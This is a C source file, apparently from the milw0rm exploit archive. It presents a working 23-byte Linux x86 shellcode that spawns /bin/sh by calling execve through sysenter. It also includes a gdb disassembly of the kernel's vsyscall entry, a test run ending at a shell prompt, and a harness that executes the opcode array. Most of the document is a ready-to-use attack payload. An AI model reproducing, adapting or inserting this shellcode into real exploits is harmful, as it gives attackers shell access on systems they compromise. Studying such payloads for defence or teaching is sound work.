/*
 lnx_binsh4.c - v1 - 23 Byte /bin/sh sysenter Opcode Array Payload
 Copyright(c) 2005 c0ntex <c0ntex@open-security.org>
 Copyright(c) 2005 BaCkSpAcE <sinisa86@gmail.com>

 This program is free software; you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation; either version 2 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program; if not, write to the Free Software
 Foundation, Inc., 59 Temple Place, Suite 330, Boston,
 MA  02111-1307  USA

*/

/*

Tested: fedora core 3 - c0ntex
	fedora core 4 - BaCkSpAcE
        debian SID - amnesia

execve("/bin/sh") using sysenter from __kernel_vsyscall appose to int $0x80

(gdb) disas __kernel_vsyscall
Dump of assembler code for function __kernel_vsyscall:
0xffffe400 <__kernel_vsyscall+0>:       push   %ecx
0xffffe401 <__kernel_vsyscall+1>:       push   %edx
0xffffe402 <__kernel_vsyscall+2>:       push   %ebp
0xffffe403 <__kernel_vsyscall+3>:       mov    %esp,%ebp
0xffffe405 <__kernel_vsyscall+5>:       sysenter
0xffffe407 <__kernel_vsyscall+7>:       nop
0xffffe408 <__kernel_vsyscall+8>:       nop
0xffffe409 <__kernel_vsyscall+9>:       nop
0xffffe40a <__kernel_vsyscall+10>:      nop
0xffffe40b <__kernel_vsyscall+11>:      nop
0xffffe40c <__kernel_vsyscall+12>:      nop
0xffffe40d <__kernel_vsyscall+13>:      nop
0xffffe40e <__kernel_vsyscall+14>:      jmp    0xffffe403 <__kernel_vsyscall+3>
0xffffe410 <__kernel_vsyscall+16>:      pop    %ebp
0xffffe411 <__kernel_vsyscall+17>:      pop    %edx
0xffffe412 <__kernel_vsyscall+18>:      pop    %ecx
0xffffe413 <__kernel_vsyscall+19>:      ret
0xffffe414 <__kernel_vsyscall+20>:      add    %al,(%eax)
0xffffe416 <__kernel_vsyscall+22>:      add    %al,(%eax)
0xffffe418 <__kernel_vsyscall+24>:      add    %al,(%eax)
0xffffe41a <__kernel_vsyscall+26>:      add    %al,(%eax)
0xffffe41c <__kernel_vsyscall+28>:      add    %al,(%eax)
0xffffe41e <__kernel_vsyscall+30>:      add    %al,(%eax)
End of assembler dump.
(gdb) q

so we replace

int $0x80

instruction with

push   %ecx
push   %edx
push   %ebp
mov    %esp,%ebp
sysenter

which does make the shellcode slightly larger  :/


 804807a:       51                      push   %ecx
 804807b:       52                      push   %edx
 804807c:       55                      push   %ebp
 804807d:       89 e5                   mov    %esp,%ebp
 804807f:       0f 34                   sysenter

 $ ./lnx_binsh4

 [-] Stack Pointer found -> [0xbfe0f0d8]
         [-] Size of payload egg -> [23]
	 [-] Payload Begin -> [0x80496c0]
	 [-] Payload End   -> [0x80496d7]

 sh-3.00b$

*/

/*
 Calling: execve(/bin/sh), exit(0)
*/


#include <stdio.h>

typedef char wikkid;

/* reduced shellcode size from 45 to 23 - BaCkSpAcE */
wikkid oPc0d3z[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f"
                   "\x73\x68\x68\x2f\x62\x69\x6e\x54"
                   "\x5b\x52\x53\x54\x59\x0f\x34";

unsigned long grab_esp()
{
		__asm__("movl %esp,%eax");
}

int main(void)
{
	unsigned long delta;
	void (*pointer)();

	delta = grab_esp();

	fprintf(stderr, "\n[-] Stack Pointer found -> [0x%x]\n", delta);
	fprintf(stderr, "\t[-] Size of payload egg -> [%d]\n", sizeof(oPc0d3z)-1);

	pointer=(void*)&oPc0d3z;

	while(pointer) {
		fprintf(stderr, "\t[-] Payload Begin -> [0x%x]\n", pointer);
		fprintf(stderr, "\t[-] Payload End   -> [0x%x]\n\n", pointer+23);
		pointer();
	}

	_exit(0);
}

// milw0rm.com [2005-09-04]